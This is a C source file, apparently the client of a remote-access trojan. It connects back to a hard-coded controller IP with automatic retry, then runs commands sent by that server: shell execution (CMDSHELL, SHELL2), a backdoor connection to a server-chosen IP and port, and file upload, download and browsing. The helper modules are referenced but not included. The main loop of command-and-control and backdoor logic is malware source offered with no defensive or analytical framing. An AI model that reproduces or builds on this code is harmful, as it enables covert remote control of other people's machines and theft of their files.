#include "refect.h"

struct client_cfg cfg;

char id[25];

void hand_sigchld(int sig)
{
	int stat;
	pid_t pid;

	pid = wait(&stat);
	printf("child pid=%d, stat=%d \n", pid, stat);
	wait_stat = stat;

}

int handle(int sockfd, char *buf, int size)
{
	int filesize;
	char *p1, *p2;
	short port;
	p1 = buf;
	char *ip;
	char *filename;


	p2 = strchr(p1, '\n');
	*p2 = '\0';
	if (strcmp(p1, "OFFLINE") == 0)
	{
		close(sockfd);
		printf("END\n");
		exit(EXIT_SUCCESS);
	}else if (strcmp(p1, "CMDSHELL") == 0)
	{
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		cmdshell_mod(p1);
	}else if (strcmp(p1, "BACKDOOR") == 0)
	{
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		ip = p1;
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		port = atoi(p1);
		backdoor_mod(ip, port);
	}else if (strcmp(p1, "UPLOAD") == 0)
	{
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		filename = p1;
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		filesize = atoi(p1);

		upload_mod(filename, filesize);

	}else if (strcmp(p1, "DOWNLOAD") == 0)
	{
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		filename = p1;

		download_mod(filename);
	}
	else if (strcmp(p1, "EXPLORER") == 0)
	{
		p2++;
		p1 = p2;
		p2 = strchr(p1, '\n');
		*p2 = '\0';
		explorer_mod(p1);
	}
	else if (strcmp(p1, "SHELL2") == 0)
	{
		shell2_mod();
	}

	return 0;
}

int connect_server(short port)
{
	int sockfd;
	struct sockaddr_in addr;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(port);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		return -1;
	}

	if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(sockfd);
		return -1;
	}
	return sockfd;
}
int init_cfg(struct client_cfg *cfg)
{
	short res_port;
	short com_port;
	com_port = atoi(COM_PORT);
	res_port = atoi(RES_PORT);
	cfg->port = com_port;
	cfg->res_port = res_port;
	cfg->timeout = 5;
	strcpy(cfg->server_IP, IP);
	return 0;

}

int main(void)
{
	int sockfd;
	int nread;
	int res;
	pid_t pid;
	//pid = fork();
	//if (pid != 0)
	//{
	//	exit(0);
	//}
	int keepalive = 1; // 开启keepalive属性
	int keepidle = 10; // 如该连接在60秒内没有任何数据往来,则进行探测
	int keepinterval = 5; // 探测时发包的时间间隔为5 秒
	int keepcount = 3; // 探测尝试的次数.如果第1次探测包就收到响应了,则后2次的不再发.
	struct sockaddr_in addr;	
	char rev_buf[BUF_SIZE + 1];
	signal(SIGCHLD, hand_sigchld);

	init_cfg(&cfg);
	memset(&addr, 0, sizeof(addr));
	addr.sin_addr.s_addr = inet_addr(cfg.server_IP);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(cfg.port);

	headbeat_shutdown = 0;

retry:
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, (void *)&keepalive , sizeof(keepalive ));
	setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPIDLE, (void*)&keepidle , sizeof(keepidle ));
	setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPINTVL, (void *)&keepinterval , sizeof(keepinterval ));
	setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPCNT, (void *)&keepcount , sizeof(keepcount ));
	if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(sockfd);
		perror("connect");
		sleep(cfg.timeout);
		goto retry;
	}	

	printf("Connected\n");
	memset(rev_buf, 0, BUF_SIZE + 1);
    //接收ID
	nread = read(sockfd, rev_buf, BUF_SIZE);
	if (nread > 0)
	{
		rev_buf[nread] = '\0';
		strncpy(id, rev_buf, 24);
		puts(id);
	}
	else if (nread <= 0)
	{
		perror("read");
		close(sockfd); //对方断开连接了
		headbeat_shutdown = 1;

		sleep(cfg.timeout);
		goto retry;
	}

	while(1)
	{
		memset(rev_buf, 0, BUF_SIZE + 1);
		//接受命令
		nread = read(sockfd, rev_buf, BUF_SIZE);
		if (nread > 0)
		{
			puts(rev_buf);
			rev_buf[nread] = '\0';
			handle(sockfd, rev_buf, nread);
		}
		else if (nread <= 0)
		{
			perror("read");
			close(sockfd); //对方断开连接了

			sleep(cfg.timeout);
			goto retry;
		}
	}
	close(sockfd);

}
